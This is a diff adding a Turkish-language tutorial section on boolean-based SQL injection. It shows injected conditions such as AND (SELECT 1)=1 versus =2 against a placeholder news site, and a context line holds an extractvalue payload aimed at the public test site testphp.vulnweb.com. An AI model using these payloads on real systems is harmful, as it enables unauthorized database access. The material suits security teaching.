@@ -325,3 +325,96 @@ http://testphp.vulnweb.com/listproducts.php?cat=extractvalue(rand(),concat(1,(SE
 ![image](https://github.com/user-attachments/assets/98e5f879-f7c2-4b9b-a1f4-15407af8c5b0)
 
 # **3- Boolean-based SQL Injection**
+
+www.x.com/?id=1 şeklinde bir url'i varsa SELECT * FROM haberler WHERE id='1' şeklinde bir sorgu çalışmaktaydı. veri tabanının sorgunun 'id'sinin 1 değerini de, '1' değerini de aynı algıladığını da biliyoruz ve id parametresine 1' and '1'='1 şeklinde bir değer girecek şeklinde url'e yazarsam o halde veri tabanında sorgu, SELECT * FROM haberler WHERE id='1' and '1' = '1' şeklinde çalışacaktır. Yani id'si 1 olan ve 1'in 1'e eşit olduğu durumu istedim ve bu yüzden sayfa da bu şekilde görüntülenir. 
+
+```
+www.x.com/?id='1' and '1' = '1'
+
+SELECT * FROM haberler WHERE id='1' and '1' = '1';
+
+<html>
+MDISEC
+</html>
+
+```
+
+Veri tabanında yaptığım denemede görülüyorki eğer ben fazladan bir tırnak koyarsam sqlin yapısı bozuluyor.
+
+![image](https://github.com/user-attachments/assets/0338cf6e-4639-491a-bc1a-dff7d87feb2b)
+
+Ama fazladan bir tırnak daha koyarsam bu sefer id'si 1 olan değer geliyor. SQL’de bir stringin içinde ' (tek tırnak) karakteri kullanmak istersen, onu çift tırnak yaparak kaçırırsın. Burada aslında 1' olan değeri arıyor ve bu sonucu veriyor.
+
+![image](https://github.com/user-attachments/assets/9710e3a0-29a0-4769-bd57-f5c053867a0d)
+
+Kod yapısında değişiklik yaparsam olacaklar: 
+
+```
+if result.size() > 0;
+    print("haber var")
+else:
+    print("haber yok")
+```
+
+Yukarıdaki gibi bir değişiklik yaparsam sonuç aşağıdaki gibi olur. Artık sorgunun sonucunu uygulama bana vermiyor.
+
+```
+www.x.com/?id=1
+
+SELECT * FROM haberler WHERE id=1;
+
+<html>
+haber var
+</html>
+```
+
+Aşağıdaki sorguların hepsi aynı şekilde sonuç veriyor.
+
+```
+SELECT * FROM haberler WHERE id=1 AND 1=1;
+SELECT * FROM haberler WHERE id=1 and (SELECT 1)=1;
+SELECT * FROM haberler WHERE id=1;
+
+
+www.x.com/?id=1 AND 1=1
+
+SELECT * FROM haberler WHERE id=1;
+
+<html>
+haber var
+</html>
+
+====================================================
+
+www.x.com/?id=1 AND (SELECT 1)=1
+
+SELECT * FROM haberler WHERE id=1 AND (SELECT 1)=1;
+
+<html>
+haber var
+</html>
+
+====================================================
+
+www.x.com/?id=1
+
+SELECT * FROM haberler WHERE id=1;
+
+<html>
+haber var
+</html>
+
+```
+
+Url'i bu şekilde girersem de sonuç bu olur. Bu da demek oluyor ki 1 veya 2 yazmama göre çektiğim data değişiyor.
+
+```
+www.x.com/?id=1 AND (SELECT 1)=2
+
+SELECT * FROM haberler WHERE id=1 AND (SELECT 1)=2;
+
+<html>
+haber yok
+</html>
+```
+
